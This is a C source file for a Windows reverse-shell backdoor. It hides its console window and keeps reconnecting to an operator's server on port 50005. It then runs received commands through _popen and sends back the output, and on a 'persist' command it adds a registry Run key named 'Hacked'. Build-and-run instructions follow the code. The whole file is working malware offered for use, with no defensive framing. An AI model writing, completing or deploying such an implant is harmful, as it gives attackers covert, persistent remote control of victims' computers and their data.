#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "advapi32")
#include <stdio.h>
#include <stdlib.h>
//#include <unistd.h>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>



int sock;


#define putZero(p, size) (void) memset((p), 0, (size))


// DESCRIPITON: Adds Registry key
int bootRun()
{
	char err[128] = "Failed\n";
	char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;

	// checks to see if file path exists otherwise send error back to server
	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if (pathLen == 0) {
		send(sock, err, sizeof(err), 0);
		return -1;
	}

	
	// checks to see if HKEY exists otherwise send error back to server
	HKEY NewVal;
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	// sets the key value, if it doesn't work it will send the error message back to the server
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	// success
	RegCloseKey(NewVal);
	send(sock, suc, sizeof(suc), 0);
	return 0;
}

// DESCRIPITON: cuts strings for the change directory functionality 
char *
str_cut(char str[], int slice_from, int slice_to)
{
        if (str[0] == '\0')
                return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str);
                if (abs(slice_to) > str_len - 1)
                        return NULL;

                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len;

                buffer_len = slice_to - slice_from;
                str += (str_len + slice_from);

        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;

        } else
                return NULL;

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
}


// DESCRIPITON: recieves commands from the server, runs them, and then sends back the output message (output, success, or error)
void Shell() {
    // returns nothing

    char buffer[1024];  // stores command
    char container[1024];
    char total_response[18384];

    // Conversation between server and client
    while (1) {
    jump:
        // zero out variables
        putZero(buffer, sizeof(buffer));
        putZero(container, sizeof(container));
        putZero(total_response, sizeof(total_response));

        // --receive command from server
        recv(sock, buffer, 1024, 0);

            // do action based off what command was recv'd in buffer
	    
	    // if command equals q, then kill the socket
            if ((strncmp("q", buffer, 1)) == 0) {
                closesocket(sock);
                WSACleanup();
                exit(0);
            }

	    // if command equals a cd, then change the directory
	    else if (strncmp("cd ", buffer, 3) == 0){
		chdir(str_cut(buffer,3,100)); // cut the first chars from the buffer and return that value to the chdir function which changes directory of the terminal
	    }

	    // if command equals perist then it will add a registry key
	    else if (strncmp("persist", buffer,7 ) == 0){
	    	bootRun();
	    }
	    // Otherwise it will run the command and send back response
            else {
                FILE* fp;
                fp = _popen(buffer, "r"); // read buffer and execute (as a process) it; store it in fp

                // copying (first, second, third, etc.) 1024 bytes from fp to container, then adding container into total_response. This is repeated until entire response is inside total_response
                    while (fgets(container, 1024, fp) != NULL) {
                        strcat_s(total_response, sizeof(total_response), container);
                    }

                // --send the response to server
                send(sock, total_response, sizeof(total_response), 0);
                fclose(fp);

            }
    }

}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPev, LPSTR lpCmdLine, int nCmdShow) {

    // Hide the console window
    HWND stealth;
    AllocConsole(); // allocate new console to calling function
    stealth = FindWindowA("ConsoleWindowClass", NULL);  // gets handle to top level window
        ShowWindow(stealth, 0); // hides the window


        // Prepping socket items
    struct sockaddr_in ServerAddr;
    unsigned short ServerPort;
    char* ServerIP;
    WSADATA wsaData; // structure that contains info about Windows Socket (Windows to Windows)
    ServerIP = ""; // REPLACE!!!
    ServerPort = 50005;

    // Kill program if conneciton is not possible
    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
        exit(1);
    }

    // Cont'd prepping socket items
    sock = socket(AF_INET, SOCK_STREAM, 0); // AF_INET: establishing connection over IPv4, SOCK_STREAM: TCP/3-way handshake
    memset(&ServerAddr, 0, sizeof(ServerAddr)); // zero out the content serverAddr (because it's structs)
    ServerAddr.sin_family = AF_INET;
    ServerAddr.sin_addr.s_addr = inet_addr(ServerIP);
    ServerAddr.sin_port = htons(ServerPort);

    // rewrite start logic...
start:
    // Perform connect function every 10 seconds until it is equal 0 (zero means connection was established)
    while (connect(sock, (struct sockaddr*)&ServerAddr, sizeof(ServerAddr)) != 0) {
        Sleep(10);
        goto start;
    }

    // recv commands from server, execute them, and then send the information back
    Shell();
}



/// Notes on how to run

// 1. Create Project within Visual Studio
// 2. Create .c file with Source Files
// 3. Copy/Paste file into .c file
// 4. Build -> Build <PROJECT-NAME> 
    // not the solution, although it still might work
// 5. Reset the Subsystem configuration to Linker->System->SubSystem should be Windows.
    // This will allow it to create .exe file and build successfully 
    // The alternative option for this is "Console". This allows you to run the .c file and have non-terminating console output the results of running the .c file
// 6. Open command prompt and navigate to: c:\PATH\TO\source\repos\PROJECTNAME\Debug
// 7. Run .exe file (but have server.c running first). It will run and end quick. On your linux/server you will have a pseudo terminal
